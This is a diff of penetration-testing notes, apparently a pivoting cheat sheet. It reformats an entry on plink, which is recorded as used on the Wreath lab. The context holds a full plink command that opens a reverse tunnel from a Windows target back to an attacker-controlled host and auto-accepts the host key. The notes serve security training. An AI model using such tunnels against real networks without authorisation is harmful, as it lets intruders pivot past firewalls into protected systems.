@@ -10,7 +10,9 @@ PuTTY's command-line SSH client. Useful on Windows targets that lack OpenSSH but
 cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
 ```
 
-Used on: **Wreath** - documented as a Windows reverse-forwarding fallback when a target can egress to the attacker but cannot be reached inbound.
+Used on: **Wreath**
+
+documented as a Windows reverse-forwarding fallback when a target can egress to the attacker but cannot be reached inbound.
 
 Example:
 
